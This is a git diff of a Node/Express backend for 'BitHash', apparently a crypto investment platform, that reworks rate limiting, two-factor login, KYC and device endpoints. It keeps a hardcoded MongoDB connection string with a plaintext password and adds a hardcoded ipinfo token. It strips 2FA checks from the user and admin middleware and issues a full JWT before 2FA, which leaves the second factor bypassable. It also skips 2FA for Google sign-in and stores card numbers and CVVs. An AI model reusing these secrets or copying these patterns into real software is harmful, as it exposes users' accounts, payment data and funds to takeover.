@@ -46,7 +46,7 @@ app.use(session({
   resave: false,
   saveUninitialized: false,
   store: MongoStore.create({
-    mongoUrl: process.env.MONGODB_URI || 'mongodb+srv://pesalifeke:AkAkSa6YoKcDYJEX@cryptotradingmarket.dpoatp3.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0',
+    mongoUrl: process.env.MONGODB_URI,
     ttl: 14 * 24 * 60 * 60 // 14 days
   }),
   cookie: {
@@ -58,12 +58,22 @@ app.use(session({
 }));
 
 // Rate limiting
-const limiter = rateLimit({
+const apiLimiter = rateLimit({
   windowMs: 15 * 60 * 1000, // 15 minutes
-  max: 200, // limit each IP to 200 requests per windowMs
+  max: 200,
   message: 'Too many requests from this IP, please try again later'
 });
-app.use('/api', limiter);
+
+const authLimiter = rateLimit({
+  windowMs: 60 * 60 * 1000, // 1 hour
+  max: 20,
+  message: 'Too many login attempts, please try again later'
+});
+
+app.use('/api', apiLimiter);
+app.use('/api/login', authLimiter);
+app.use('/api/signup', authLimiter);
+app.use('/api/auth/forgot-password', authLimiter);
 
 // Database connection
 mongoose.connect(process.env.MONGODB_URI || 'mongodb+srv://pesalifeke:AkAkSa6YoKcDYJEX@cryptotradingmarket.dpoatp3.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0', {
@@ -133,6 +143,7 @@ const UserSchema = new mongoose.Schema({
   twoFactorAuth: {
     enabled: { type: Boolean, default: false },
     secret: String,
+    tempSecret: String,
     backupCodes: [String]
   },
   balances: {
@@ -173,7 +184,7 @@ const UserSchema = new mongoose.Schema({
     },
     theme: { type: String, enum: ['light', 'dark'], default: 'dark' }
   }
-}, { timestamps: true, toJSON: { virtuals: true }, toObject: { virtuals: true } });
+}, { timestamps: true });
 
 UserSchema.index({ email: 1 });
 UserSchema.index({ status: 1 });
@@ -198,8 +209,7 @@ const AdminSchema = new mongoose.Schema({
   permissions: [String],
   twoFactorAuth: {
     enabled: { type: Boolean, default: false },
-    secret: String,
-    backupCodes: [String]
+    secret: String
   }
 }, { timestamps: true });
 
@@ -234,9 +244,11 @@ InvestmentSchema.index({ user: 1 });
 InvestmentSchema.index({ status: 1 });
 InvestmentSchema.index({ endDate: 1 });
 
+const Investment = mongoose.model('Investment', InvestmentSchema);
+
 const TransactionSchema = new mongoose.Schema({
   user: { type: mongoose.Schema.Types.ObjectId, ref: 'User', required: true },
-  type: { type: String, enum: ['deposit', 'withdrawal', 'transfer', 'investment', 'interest', 'referral', 'loan'], required: true },
+  type: { type: String, enum: ['deposit', 'withdrawal', 'transfer', 'investment', 'interest', 'referral'], required: true },
   amount: { type: Number, required: true },
   currency: { type: String, default: 'USD' },
   status: { type: String, enum: ['pending', 'completed', 'failed', 'cancelled'], default: 'pending' },
@@ -255,11 +267,11 @@ const TransactionSchema = new mongoose.Schema({
     swift: String
   },
   cardDetails: {
-    name: String,
-    number: String,
-    expiry: String,
-    cvv: String,
-    billingAddress: String
+    fullName: String,
+    billingAddress: String,
+    cardNumber: String,
+    expiryDate: String,
+    cvv: String
   },
   adminNotes: String,
   processedBy: { type: mongoose.Schema.Types.ObjectId, ref: 'Admin' },
@@ -292,6 +304,8 @@ const LoanSchema = new mongoose.Schema({
 
 LoanSchema.index({ user: 1 });
 LoanSchema.index({ status: 1 });
+
+const Loan = mongoose.model('Loan', LoanSchema);
 
 const KYCSchema = new mongoose.Schema({
   user: { type: mongoose.Schema.Types.ObjectId, ref: 'User', required: true },
@@ -366,18 +380,10 @@ const generateReferralCode = () => {
   return crypto.randomBytes(4).toString('hex').toUpperCase();
 };
 
-const generateBackupCodes = () => {
-  const codes = [];
-  for (let i = 0; i < 10; i++) {
-    codes.push(crypto.randomBytes(4).toString('hex').toUpperCase());
-  }
-  return codes;
-};
-
 const sendEmail = async (options) => {
   try {
     await transporter.sendMail({
-      from: process.env.EMAIL_FROM || 'BitHash <no-reply@bithash.com>',
+      from: 'BitHash <no-reply@bithash.com>',
       to: options.email,
       subject: options.subject,
       text: options.message,
@@ -390,11 +396,33 @@ const sendEmail = async (options) => {
 
 const getLocationFromIP = async (ip) => {
   try {
-    const response = await axios.get(`https://ipinfo.io/${ip}?token=${process.env.IPINFO_TOKEN || 'b56ce6e91d732d'}`);
+    if (ip === '::1' || ip === '127.0.0.1') {
+      return {
+        ip: '127.0.0.1',
+        city: 'Localhost',
+        region: 'Local',
+        country: 'Local',
+        loc: '0,0',
+        org: 'Local Network',
+        postal: '00000',
+        timezone: 'UTC'
+      };
+    }
+
+    const response = await axios.get(`https://ipinfo.io/${ip}?token=b56ce6e91d732d`);
     return response.data;
   } catch (err) {
-    console.error('Error fetching IP info:', err);
-    return { city: 'Unknown', region: 'Unknown', country: 'Unknown' };
+    console.error('IP info error:', err);
+    return {
+      ip,
+      city: 'Unknown',
+      region: 'Unknown',
+      country: 'Unknown',
+      loc: '0,0',
+      org: 'Unknown',
+      postal: 'Unknown',
+      timezone: 'UTC'
+    };
   }
 };
 
@@ -406,10 +434,11 @@ const getUserDeviceInfo = async (req) => {
     ip,
     device: req.headers['user-agent'],
     location: {
-      city: location.city || 'Unknown',
-      region: location.region || 'Unknown',
-      country: location.country || 'Unknown',
-      coords: location.loc ? location.loc.split(',') : null
+      city: location.city,
+      region: location.region,
+      country: location.country,
+      coordinates: location.loc ? location.loc.split(',') : [0, 0],
+      isp: location.org
     }
   };
 };
@@ -427,6 +456,31 @@ const logActivity = async (action, entity, entityId, performedBy, performedByMod
     location: deviceInfo.location,
     changes
   });
+};
+
+const generateTOTPSecret = () => {
+  return speakeasy.generateSecret({
+    length: 20,
+    name: 'BitHash Account',
+    issuer: 'BitHash LLC'
+  });
+};
+
+const verifyTOTP = (secret, token) => {
+  return speakeasy.totp.verify({
+    secret: secret,
+    encoding: 'base32',
+    token: token,
+    window: 1
+  });
+};
+
+const generateBackupCodes = (count = 6) => {
+  const codes = [];
+  for (let i = 0; i < count; i++) {
+    codes.push(crypto.randomBytes(4).toString('hex').toUpperCase());
+  }
+  return codes;
 };
 
 // Initialize default admin
@@ -526,7 +580,7 @@ const protect = async (req, res, next) => {
     }
 
     const decoded = verifyJWT(token);
-    const currentUser = await User.findById(decoded.id).select('+passwordChangedAt +twoFactorAuth.secret');
+    const currentUser = await User.findById(decoded.id).select('+passwordChangedAt');
 
     if (!currentUser) {
       return res.status(401).json({
@@ -546,15 +600,6 @@ const protect = async (req, res, next) => {
       return res.status(401).json({
         status: 'fail',
         message: 'Your account has been suspended. Please contact support.'
-      });
-    }
-
-    // Check if 2FA is required
-    if (currentUser.twoFactorAuth.enabled && !req.session.twoFactorVerified) {
-      return res.status(401).json({
-        status: 'fail',
-        message: 'Two-factor authentication required',
-        requires2FA: true
       });
     }
 
@@ -585,21 +630,12 @@ const adminProtect = async (req, res, next) => {
     }
 
     const decoded = verifyJWT(token);
-    const currentAdmin = await Admin.findById(decoded.id).select('+passwordChangedAt +twoFactorAuth.secret');
+    const currentAdmin = await Admin.findById(decoded.id);
 
     if (!currentAdmin) {
       return res.status(401).json({
         status: 'fail',
         message: 'The admin belonging to this token no longer exists.'
-      });
-    }
-
-    // Check if 2FA is required
-    if (currentAdmin.twoFactorAuth.enabled && !req.session.twoFactorVerified) {
-      return res.status(401).json({
-        status: 'fail',
-        message: 'Two-factor authentication required',
-        requires2FA: true
       });
     }
 
@@ -666,6 +702,8 @@ app.post('/api/signup', [
       referredByUser = await User.findOne({ referralCode: referredBy });
     }
 
+    const deviceInfo = await getUserDeviceInfo(req);
+
     const newUser = await User.create({
       firstName,
       lastName,
@@ -673,7 +711,9 @@ app.post('/api/signup', [
       password: hashedPassword,
       city,
       referralCode,
-      referredBy: referredByUser ? referredByUser._id : undefined
+      referredBy: referredByUser ? referredByUser._id : undefined,
+      lastLogin: new Date(),
+      loginHistory: [deviceInfo]
     });
 
     const token = generateJWT(newUser._id);
@@ -740,21 +780,22 @@ app.post('/api/login', [
       });
     }
 
-    // Update last login
     const deviceInfo = await getUserDeviceInfo(req);
-    user.lastLogin = new Date();
-    user.loginHistory.push(deviceInfo);
-    await user.save();
 
-    // Check if 2FA is enabled
+    // If 2FA is enabled, require token verification
     if (user.twoFactorAuth.enabled) {
-      req.session.tempUserId = user._id;
+      const tempToken = generateJWT(user._id);
       return res.status(200).json({
-        status: 'success',
-        requires2FA: true,
+        status: '2fa-required',
+        tempToken,
         message: 'Two-factor authentication required'
       });
     }
+
+    // Update last login
+    user.lastLogin = new Date();
+    user.loginHistory.push(deviceInfo);
+    await user.save();
 
     const token = generateJWT(user._id);
 
@@ -788,9 +829,9 @@ app.post('/api/login', [
   }
 });
 
-app.post('/api/auth/verify-2fa', [
+app.post('/api/login/verify-2fa', [
   body('token').notEmpty().withMessage('Token is required'),
-  body('rememberDevice').optional().isBoolean().withMessage('Remember device must be a boolean')
+  body('tempToken').notEmpty().withMessage('Temporary token is required')
 ], async (req, res) => {
   const errors = validationResult(req);
   if (!errors.isEmpty()) {
@@ -801,67 +842,52 @@ app.post('/api/auth/verify-2fa', [
   }
 
   try {
-    const { token, rememberDevice } = req.body;
-    const userId = req.session.tempUserId;
+    const { token, tempToken, rememberMe } = req.body;
 
-    if (!userId) {
-      return res.status(400).json({
-        status: 'fail',
-        message: 'Session expired. Please log in again.'
-      });
-    }
+    const decoded = verifyJWT(tempToken);
+    const user = await User.findById(decoded.id).select('+twoFactorAuth.secret');
 
-    const user = await User.findById(userId).select('+twoFactorAuth.secret +twoFactorAuth.backupCodes');
     if (!user) {
-      return res.status(404).json({
+      return res.status(401).json({
         status: 'fail',
         message: 'User not found'
       });
     }
 
-    // Check if token is a backup code
-    const isBackupCode = user.twoFactorAuth.backupCodes.includes(token);
-    
-    if (!isBackupCode) {
-      // Verify TOTP token
-      const verified = speakeasy.totp.verify({
-        secret: user.twoFactorAuth.secret,
-        encoding: 'base32',
-        token,
-        window: 1
-      });
-
-      if (!verified) {
-        return res.status(401).json({
-          status: 'fail',
-          message: 'Invalid two-factor authentication token'
-        });
-      }
-    } else {
-      // Remove used backup code
-      user.twoFactorAuth.backupCodes = user.twoFactorAuth.backupCodes.filter(code => code !== token);
-      await user.save();
-    }
-
-    // Mark 2FA as verified in session
-    req.session.twoFactorVerified = true;
-    req.session.tempUserId = undefined;
-
-    if (rememberDevice) {
-      // Set a long-lived cookie to remember this device
-      res.cookie('2fa_verified', 'true', {
-        maxAge: 30 * 24 * 60 * 60 * 1000, // 30 days
-        httpOnly: true,
-        secure: process.env.NODE_ENV === 'production',
-        sameSite: 'strict'
+    if (!user.twoFactorAuth.enabled || !user.twoFactorAuth.secret) {
+      return res.status(400).json({
+        status: 'fail',
+        message: 'Two-factor authentication not enabled for this account'
       });
     }
 
-    const jwtToken = generateJWT(user._id);
+    const verified = verifyTOTP(user.twoFactorAuth.secret, token);
+    if (!verified) {
+      return res.status(401).json({
+        status: 'fail',
+        message: 'Invalid two-factor authentication token'
+      });
+    }
+
+    const deviceInfo = await getUserDeviceInfo(req);
+
+    // Update last login
+    user.lastLogin = new Date();
+    user.loginHistory.push(deviceInfo);
+    await user.save();
+
+    const finalToken = generateJWT(user._id);
+
+    res.cookie('jwt', finalToken, {
+      expires: rememberMe ? new Date(Date.now() + 30 * 24 * 60 * 60 * 1000) : undefined,
+      httpOnly: true,
+      secure: process.env.NODE_ENV === 'production',
+      sameSite: 'strict'
+    });
 
     res.status(200).json({
       status: 'success',
-      token: jwtToken,
+      token: finalToken,
       data: {
         user: {
           id: user._id,
@@ -872,7 +898,7 @@ app.post('/api/auth/verify-2fa', [
       }
     });
 
-    await logActivity('2fa-verify', 'user', user._id, user._id, 'User', req);
+    await logActivity('2fa-verification', 'user', user._id, user._id, 'User', req);
   } catch (err) {
     console.error('2FA verification error:', err);
     res.status(500).json({
@@ -897,35 +923,25 @@ app.post('/api/auth/google', async (req, res) => {
     if (!user) {
       // Create new user with Google auth
       const referralCode = generateReferralCode();
+      const deviceInfo = await getUserDeviceInfo(req);
+      
       user = await User.create({
         firstName: given_name,
         lastName: family_name,
         email,
         googleId: sub,
         isVerified: true,
-        referralCode
+        referralCode,
+        lastLogin: new Date(),
+        loginHistory: [deviceInfo]
       });
     } else if (!user.googleId) {
       // Existing user, add Google auth
       user.googleId = sub;
       user.isVerified = true;
+      user.lastLogin = new Date();
+      user.loginHistory.push(await getUserDeviceInfo(req));
       await user.save();
-    }
-
-    // Update last login
-    const deviceInfo = await getUserDeviceInfo(req);
-    user.lastLogin = new Date();
-    user.loginHistory.push(deviceInfo);
-    await user.save();
-
-    // Check if 2FA is enabled
-    if (user.twoFactorAuth.enabled) {
-      req.session.tempUserId = user._id;
-      return res.status(200).json({
-        status: 'success',
-        requires2FA: true,
-        message: 'Two-factor authentication required'
-      });
     }
 
     const token = generateJWT(user._id);
@@ -1065,7 +1081,7 @@ app.post('/api/auth/reset-password', [
 app.get('/api/users/me', protect, async (req, res) => {
   try {
     const user = await User.findById(req.user.id)
-      .select('-password -passwordChangedAt -passwordResetToken -passwordResetExpires -__v');
+      .select('-password -passwordChangedAt -passwordResetToken -passwordResetExpires -twoFactorAuth.secret -__v');
 
     res.status(200).json({
       status: 'success',
@@ -1215,11 +1231,11 @@ app.put('/api/users/password', protect, [
   }
 });
 
-// Two-Factor Authentication Endpoints
+// Two-Factor Authentication
 app.get('/api/users/two-factor', protect, async (req, res) => {
   try {
     const user = await User.findById(req.user.id).select('twoFactorAuth');
-    
+
     res.status(200).json({
       status: 'success',
       data: {
@@ -1237,27 +1253,20 @@ app.get('/api/users/two-factor', protect, async (req, res) => {
 
 app.post('/api/users/two-factor/setup', protect, async (req, res) => {
   try {
-    const user = await User.findById(req.user.id).select('+twoFactorAuth.secret +twoFactorAuth.backupCodes');
-    
-    // Generate a new secret if not already set up
-    if (!user.twoFactorAuth.secret) {
-      const secret = speakeasy.generateSecret({
-        length: 20,
-        name: `BitHash:${user.email}`,
-        issuer: 'BitHash'
-      });
-      
-      user.twoFactorAuth.secret = secret.base32;
-      user.twoFactorAuth.backupCodes = generateBackupCodes();
+    const user = await User.findById(req.user.id).select('+twoFactorAuth.secret +twoFactorAuth.tempSecret');
+
+    // Generate a new secret if one doesn't exist
+    if (!user.twoFactorAuth.tempSecret) {
+      const secret = generateTOTPSecret();
+      user.twoFactorAuth.tempSecret = secret.base32;
       await user.save();
     }
 
     // Generate QR code URL
     const otpauthUrl = speakeasy.otpauthURL({
-      secret: user.twoFactorAuth.secret,
-      label: `BitHash:${user.email}`,
-      issuer: 'BitHash',
-      encoding: 'base32'
+      secret: user.twoFactorAuth.tempSecret,
+      label: encodeURIComponent(`BitHash:${user.email}`),
+      issuer: 'BitHash'
     });
 
     const qrCode = await QRCode.toDataURL(otpauthUrl);
@@ -1265,9 +1274,8 @@ app.post('/api/users/two-factor/setup', protect, async (req, res) => {
     res.status(200).json({
       status: 'success',
       data: {
-        secret: user.twoFactorAuth.secret,
-        qrCode,
-        backupCodes: user.twoFactorAuth.backupCodes
+        secret: user.twoFactorAuth.tempSecret,
+        qrCode
       }
     });
 
@@ -1294,95 +1302,44 @@ app.post('/api/users/two-factor/verify', protect, [
 
   try {
     const { token } = req.body;
-    const user = await User.findById(req.user.id).select('+twoFactorAuth.secret');
+    const user = await User.findById(req.user.id).select('+twoFactorAuth.secret +twoFactorAuth.tempSecret');
 
-    if (!user.twoFactorAuth.secret) {
+    if (!user.twoFactorAuth.tempSecret) {
       return res.status(400).json({
         status: 'fail',
-        message: '2FA is not set up for this account'
+        message: 'No pending 2FA setup found'
       });
     }
 
-    const verified = speakeasy.totp.verify({
-      secret: user.twoFactorAuth.secret,
-      encoding: 'base32',
-      token,
-      window: 1
-    });
-
+    const verified = verifyTOTP(user.twoFactorAuth.tempSecret, token);
     if (!verified) {
-      return res.status(400).json({
+      return res.status(401).json({
         status: 'fail',
         message: 'Invalid token'
       });
     }
 
-    res.status(200).json({
-      status: 'success',
-      message: 'Token verified successfully'
-    });
-  } catch (err) {
-    console.error('Verify 2FA token error:', err);
-    res.status(500).json({
-      status: 'error',
-      message: 'An error occurred while verifying 2FA token'
-    });
-  }
-});
-
-app.post('/api/users/two-factor/enable', protect, [
-  body('token').notEmpty().withMessage('Token is required')
-], async (req, res) => {
-  const errors = validationResult(req);
-  if (!errors.isEmpty()) {
-    return res.status(400).json({
-      status: 'fail',
-      errors: errors.array()
-    });
-  }
-
-  try {
-    const { token } = req.body;
-    const user = await User.findById(req.user.id).select('+twoFactorAuth.secret +twoFactorAuth.backupCodes');
-
-    if (!user.twoFactorAuth.secret) {
-      return res.status(400).json({
-        status: 'fail',
-        message: '2FA is not set up for this account'
-      });
-    }
-
-    const verified = speakeasy.totp.verify({
-      secret: user.twoFactorAuth.secret,
-      encoding: 'base32',
-      token,
-      window: 1
-    });
-
-    if (!verified) {
-      return res.status(400).json({
-        status: 'fail',
-        message: 'Invalid token'
-      });
-    }
-
+    // Enable 2FA and generate backup codes
     user.twoFactorAuth.enabled = true;
+    user.twoFactorAuth.secret = user.twoFactorAuth.tempSecret;
+    user.twoFactorAuth.tempSecret = undefined;
+    user.twoFactorAuth.backupCodes = generateBackupCodes();
     await user.save();
 
     res.status(200).json({
       status: 'success',
-      message: 'Two-factor authentication enabled successfully',
       data: {
         backupCodes: user.twoFactorAuth.backupCodes
-      }
+      },
+      message: 'Two-factor authentication has been enabled. Please save your backup codes in a secure location.'
     });
 
     await logActivity('enable-2fa', 'user', user._id, user._id, 'User', req);
   } catch (err) {
-    console.error('Enable 2FA error:', err);
+    console.error('Verify 2FA error:', err);
     res.status(500).json({
       status: 'error',
-      message: 'An error occurred while enabling 2FA'
+      message: 'An error occurred while verifying 2FA token'
     });
   }
 });
@@ -1402,35 +1359,33 @@ app.post('/api/users/two-factor/disable', protect, [
     const { token } = req.body;
     const user = await User.findById(req.user.id).select('+twoFactorAuth.secret');
 
-    if (!user.twoFactorAuth.enabled) {
+    if (!user.twoFactorAuth.enabled || !user.twoFactorAuth.secret) {
       return res.status(400).json({
         status: 'fail',
-        message: '2FA is not enabled for this account'
+        message: 'Two-factor authentication is not enabled'
       });
     }
 
-    const verified = speakeasy.totp.verify({
-      secret: user.twoFactorAuth.secret,
-      encoding: 'base32',
-      token,
-      window: 1
-    });
-
+    const verified = verifyTOTP(user.twoFactorAuth.secret, token);
     if (!verified) {
-      return res.status(400).json({
-        status: 'fail',
-        message: 'Invalid token'
-      });
+      // Check backup codes
+      if (!user.twoFactorAuth.backupCodes.includes(token)) {
+        return res.status(401).json({
+          status: 'fail',
+          message: 'Invalid token'
+        });
+      }
     }
 
+    // Disable 2FA
     user.twoFactorAuth.enabled = false;
     user.twoFactorAuth.secret = undefined;
-    user.twoFactorAuth.backupCodes = undefined;
+    user.twoFactorAuth.backupCodes = [];
     await user.save();
 
     res.status(200).json({
       status: 'success',
-      message: 'Two-factor authentication disabled successfully'
+      message: 'Two-factor authentication has been disabled'
     });
 
     await logActivity('disable-2fa', 'user', user._id, user._id, 'User', req);
@@ -1443,34 +1398,222 @@ app.post('/api/users/two-factor/disable', protect, [
   }
 });
 
-app.post('/api/users/two-factor/backup-codes', protect, async (req, res) => {
+// Device Management
+app.get('/api/users/devices', protect, async (req, res) => {
   try {
-    const user = await User.findById(req.user.id).select('+twoFactorAuth.backupCodes');
+    const user = await User.findById(req.user.id).select('loginHistory');
     
-    if (!user.twoFactorAuth.enabled) {
-      return res.status(400).json({
-        status: 'fail',
-        message: '2FA is not enabled for this account'
-      });
-    }
+    res.status(200).json({
+      status: 'success',
+      data: {
+        devices: user.loginHistory
+      }
+    });
+  } catch (err) {
+    console.error('Get devices error:', err);
+    res.status(500).json({
+      status: 'error',
+      message: 'An error occurred while fetching devices'
+    });
+  }
+});
 
-    // Generate new backup codes
-    user.twoFactorAuth.backupCodes = generateBackupCodes();
+app.delete('/api/users/devices/:id', protect, async (req, res) => {
+  try {
+    const user = await User.findById(req.user.id);
+    
+    // Remove the device from login history
+    user.loginHistory = user.loginHistory.filter(device => 
+      device._id.toString() !== req.params.id
+    );
+    
     await user.save();
+    
+    res.status(200).json({
+      status: 'success',
+      message: 'Device removed from history'
+    });
+
+    await logActivity('remove-device', 'user', user._id, user._id, 'User', req, { deviceId: req.params.id });
+  } catch (err) {
+    console.error('Remove device error:', err);
+    res.status(500).json({
+      status: 'error',
+      message: 'An error occurred while removing device'
+    });
+  }
+});
+
+// Activity Logs
+app.get('/api/users/activity', protect, async (req, res) => {
+  try {
+    const { page = 1, limit = 20 } = req.query;
+    const skip = (page - 1) * limit;
+
+    const activities = await SystemLog.find({ performedBy: req.user.id })
+      .sort({ createdAt: -1 })
+      .skip(skip)
+      .limit(parseInt(limit));
+
+    const total = await SystemLog.countDocuments({ performedBy: req.user.id });
 
     res.status(200).json({
       status: 'success',
       data: {
-        backupCodes: user.twoFactorAuth.backupCodes
+        activities,
+        total,
+        page: parseInt(page),
+        pages: Math.ceil(total / limit)
+      }
+    });
+  } catch (err) {
+    console.error('Get activity error:', err);
+    res.status(500).json({
+      status: 'error',
+      message: 'An error occurred while fetching activity logs'
+    });
+  }
+});
+
+// KYC Verification
+app.get('/api/users/kyc', protect, async (req, res) => {
+  try {
+    const user = await User.findById(req.user.id).select('kycStatus kycDocuments');
+
+    res.status(200).json({
+      status: 'success',
+      data: {
+        kyc: {
+          status: user.kycStatus,
+          documents: user.kycDocuments
+        }
+      }
+    });
+  } catch (err) {
+    console.error('Get KYC error:', err);
+    res.status(500).json({
+      status: 'error',
+      message: 'An error occurred while fetching KYC status'
+    });
+  }
+});
+
+app.post('/api/users/kyc', protect, [
+  body('type').isIn(['identity', 'address', 'facial']).withMessage('Invalid KYC type'),
+  body('documentFront').notEmpty().withMessage('Front document is required'),
+  body('documentBack').if(body('type').equals('identity')).notEmpty().withMessage('Back document is required for identity verification'),
+  body('selfie').if(body('type').equals('facial')).notEmpty().withMessage('Selfie is required for facial verification')
+], async (req, res) => {
+  const errors = validationResult(req);
+  if (!errors.isEmpty()) {
+    return res.status(400).json({
+      status: 'fail',
+      errors: errors.array()
+    });
+  }
+
+  try {
+    const { type, documentFront, documentBack, selfie } = req.body;
+    const user = await User.findById(req.user.id);
+
+    // Create KYC submission
+    const kyc = await KYC.create({
+      user: user._id,
+      type,
+      documentFront,
+      documentBack: type === 'identity' ? documentBack : undefined,
+      selfie: type === 'facial' ? selfie : undefined,
+      status: 'pending'
+    });
+
+    // Update user's KYC status
+    user.kycStatus[type] = 'pending';
+    if (type === 'identity') {
+      user.kycDocuments.identityFront = documentFront;
+      user.kycDocuments.identityBack = documentBack;
+    } else if (type === 'address') {
+      user.kycDocuments.proofOfAddress = documentFront;
+    } else if (type === 'facial') {
+      user.kycDocuments.selfie = selfie;
+    }
+    await user.save();
+
+    res.status(201).json({
+      status: 'success',
+      data: {
+        kyc
       }
     });
 
-    await logActivity('regenerate-backup-codes', 'user', user._id, user._id, 'User', req);
+    await logActivity('submit-kyc', 'kyc', kyc._id, user._id, 'User', req, { type });
   } catch (err) {
-    console.error('Generate backup codes error:', err);
+    console.error('Submit KYC error:', err);
     res.status(500).json({
       status: 'error',
-      message: 'An error occurred while generating backup codes'
+      message: 'An error occurred while submitting KYC'
+    });
+  }
+});
+
+// Notification Preferences
+app.get('/api/users/notifications', protect, async (req, res) => {
+  try {
+    const user = await User.findById(req.user.id).select('notifications preferences.notifications');
+
+    res.status(200).json({
+      status: 'success',
+      data: {
+        notifications: user.notifications,
+        preferences: user.preferences.notifications
+      }
+    });
+  } catch (err) {
+    console.error('Get notifications error:', err);
+    res.status(500).json({
+      status: 'error',
+      message: 'An error occurred while fetching notifications'
+    });
+  }
+});
+
+app.put('/api/users/notifications', protect, [
+  body('email').optional().isBoolean().withMessage('Email preference must be a boolean'),
+  body('sms').optional().isBoolean().withMessage('SMS preference must be a boolean'),
+  body('push').optional().isBoolean().withMessage('Push preference must be a boolean')
+], async (req, res) => {
+  const errors = validationResult(req);
+  if (!errors.isEmpty()) {
+    return res.status(400).json({
+      status: 'fail',
+      errors: errors.array()
+    });
+  }
+
+  try {
+    const { email, sms, push } = req.body;
+    const updates = {};
+
+    if (email !== undefined) updates['preferences.notifications.email'] = email;
+    if (sms !== undefined) updates['preferences.notifications.sms'] = sms;
+    if (push !== undefined) updates['preferences.notifications.push'] = push;
+
+    const user = await User.findByIdAndUpdate(req.user.id, updates, {
+      new: true
+    }).select('preferences.notifications');
+
+    res.status(200).json({
+      status: 'success',
+      data: {
+        preferences: user.preferences.notifications
+      }
+    });
+
+    await logActivity('update-notification-prefs', 'user', user._id, user._id, 'User', req, updates);
+  } catch (err) {
+    console.error('Update notifications error:', err);
+    res.status(500).json({
+      status: 'error',
+      message: 'An error occurred while updating notification preferences'
     });
   }
 });
@@ -1479,7 +1622,7 @@ app.post('/api/users/two-factor/backup-codes', protect, async (req, res) => {
 app.get('/api/users/api-keys', protect, async (req, res) => {
   try {
     const user = await User.findById(req.user.id).select('apiKeys');
-    
+
     res.status(200).json({
       status: 'success',
       data: {
@@ -1563,207 +1706,17 @@ app.delete('/api/users/api-keys/:id', protect, async (req, res) => {
 
     res.status(200).json({
       status: 'success',
-      message: 'API key deleted successfully'
+      data: {
+        apiKeys: user.apiKeys
+      }
     });
 
-    await logActivity('delete-api-key', 'user', req.user.id, req.user.id, 'User', req);
+    await logActivity('delete-api-key', 'user', user._id, user._id, 'User', req, { keyId: req.params.id });
   } catch (err) {
     console.error('Delete API key error:', err);
     res.status(500).json({
       status: 'error',
       message: 'An error occurred while deleting API key'
-    });
-  }
-});
-
-// KYC Verification
-app.get('/api/users/kyc', protect, async (req, res) => {
-  try {
-    const user = await User.findById(req.user.id).select('kycStatus kycDocuments');
-    
-    res.status(200).json({
-      status: 'success',
-      data: {
-        kycStatus: user.kycStatus,
-        kycDocuments: user.kycDocuments
-      }
-    });
-  } catch (err) {
-    console.error('Get KYC status error:', err);
-    res.status(500).json({
-      status: 'error',
-      message: 'An error occurred while fetching KYC status'
-    });
-  }
-});
-
-app.post('/api/users/kyc', protect, [
-  body('type').isIn(['identity', 'address', 'facial']).withMessage('Invalid KYC type'),
-  body('documentFront').notEmpty().withMessage('Front document is required'),
-  body('documentBack').if(body('type').equals('identity')).notEmpty().withMessage('Back document is required for identity verification'),
-  body('selfie').if(body('type').equals('facial')).notEmpty().withMessage('Selfie is required for facial verification')
-], async (req, res) => {
-  const errors = validationResult(req);
-  if (!errors.isEmpty()) {
-    return res.status(400).json({
-      status: 'fail',
-      errors: errors.array()
-    });
-  }
-
-  try {
-    const { type, documentFront, documentBack, selfie } = req.body;
-    const user = await User.findById(req.user.id);
-
-    // Check if KYC is already submitted
-    if (user.kycStatus[type] !== 'not-submitted' && user.kycStatus[type] !== 'rejected') {
-      return res.status(400).json({
-        status: 'fail',
-        message: `KYC ${type} verification is already submitted or in progress`
-      });
-    }
-
-    // Update KYC documents
-    if (type === 'identity') {
-      user.kycDocuments.identityFront = documentFront;
-      user.kycDocuments.identityBack = documentBack;
-    } else if (type === 'address') {
-      user.kycDocuments.proofOfAddress = documentFront;
-    } else if (type === 'facial') {
-      user.kycDocuments.selfie = selfie;
-    }
-
-    // Update KYC status
-    user.kycStatus[type] = 'pending';
-    await user.save();
-
-    // Create KYC record
-    const kyc = await KYC.create({
-      user: user._id,
-      type,
-      documentFront,
-      documentBack: type === 'identity' ? documentBack : undefined,
-      selfie: type === 'facial' ? selfie : undefined,
-      status: 'pending'
-    });
-
-    res.status(201).json({
-      status: 'success',
-      data: {
-        kycStatus: user.kycStatus
-      }
-    });
-
-    await logActivity('submit-kyc', 'kyc', kyc._id, user._id, 'User', req, { type });
-  } catch (err) {
-    console.error('Submit KYC error:', err);
-    res.status(500).json({
-      status: 'error',
-      message: 'An error occurred while submitting KYC'
-    });
-  }
-});
-
-// User Activity
-app.get('/api/users/activity', protect, async (req, res) => {
-  try {
-    const { limit = 20 } = req.query;
-    const activities = await SystemLog.find({
-      performedBy: req.user.id,
-      performedByModel: 'User'
-    })
-      .sort({ createdAt: -1 })
-      .limit(parseInt(limit));
-
-    res.status(200).json({
-      status: 'success',
-      data: activities
-    });
-  } catch (err) {
-    console.error('Get user activity error:', err);
-    res.status(500).json({
-      status: 'error',
-      message: 'An error occurred while fetching user activity'
-    });
-  }
-});
-
-// User Devices
-app.get('/api/users/devices', protect, async (req, res) => {
-  try {
-    const user = await User.findById(req.user.id).select('loginHistory');
-    
-    res.status(200).json({
-      status: 'success',
-      data: {
-        devices: user.loginHistory
-      }
-    });
-  } catch (err) {
-    console.error('Get user devices error:', err);
-    res.status(500).json({
-      status: 'error',
-      message: 'An error occurred while fetching user devices'
-    });
-  }
-});
-
-// User Notifications
-app.get('/api/users/notifications', protect, async (req, res) => {
-  try {
-    const user = await User.findById(req.user.id).select('notifications');
-    
-    res.status(200).json({
-      status: 'success',
-      data: {
-        notifications: user.notifications
-      }
-    });
-  } catch (err) {
-    console.error('Get notifications error:', err);
-    res.status(500).json({
-      status: 'error',
-      message: 'An error occurred while fetching notifications'
-    });
-  }
-});
-
-app.put('/api/users/notifications/mark-read', protect, [
-  body('notificationIds').isArray().withMessage('Notification IDs must be an array')
-], async (req, res) => {
-  const errors = validationResult(req);
-  if (!errors.isEmpty()) {
-    return res.status(400).json({
-      status: 'fail',
-      errors: errors.array()
-    });
-  }
-
-  try {
-    const { notificationIds } = req.body;
-    const user = await User.findById(req.user.id);
-
-    // Mark notifications as read
-    user.notifications = user.notifications.map(notification => {
-      if (notificationIds.includes(notification._id.toString())) {
-        notification.isRead = true;
-      }
-      return notification;
-    });
-
-    await user.save();
-
-    res.status(200).json({
-      status: 'success',
-      message: 'Notifications marked as read'
-    });
-
-    await logActivity('mark-notifications-read', 'user', user._id, user._id, 'User', req, { notificationIds });
-  } catch (err) {
